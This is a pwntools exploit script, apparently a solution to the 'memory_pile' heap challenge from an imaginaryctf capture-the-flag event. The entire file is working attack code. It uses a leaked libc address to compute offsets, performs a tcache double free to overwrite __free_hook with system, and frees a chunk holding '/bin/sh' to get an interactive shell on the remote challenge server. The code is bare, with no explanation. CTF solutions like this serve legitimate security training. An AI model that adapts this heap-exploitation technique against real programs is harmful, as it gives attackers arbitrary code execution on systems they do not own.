from pwn import *
p = remote('chal.imaginaryctf.org', 42007)
#p = process('./memory_pile')
#pid = gdb.attach(p,gdbscript='''
#    b * fill
#    b * acquire
#    b * release

#''')

def acquire(index):
    p.sendlineafter('> ','1')
    p.sendlineafter('> ',str(index))


def fill(index,content):
    p.sendlineafter('> ','3')
    p.sendlineafter('> ',str(index))
    p.sendlineafter('> ',str(content))


def release(index):
    p.sendlineafter('> ','2')
    p.sendlineafter('> ',str(index))



p.recvuntil('..\n')
leak = int(p.recvline(),16)
libc_base = leak -0x0000000000064f00
free_hook = libc_base + 0x00000000003ed8e8
system = libc_base + 0x000000000004f4e0
print 'leak: ',hex(leak)
print 'libc_base: ',hex(libc_base)
print 'free_hook: ',hex(free_hook)
print 'system: ',hex(system)


acquire(0)
acquire(1)
fill(1,'/bin/sh\0')

release(0)
release(0)

acquire(0)

fill(0,p64(free_hook))
acquire(2)
acquire(3)

fill(3,p64(system))


release(1)

p.interactive()
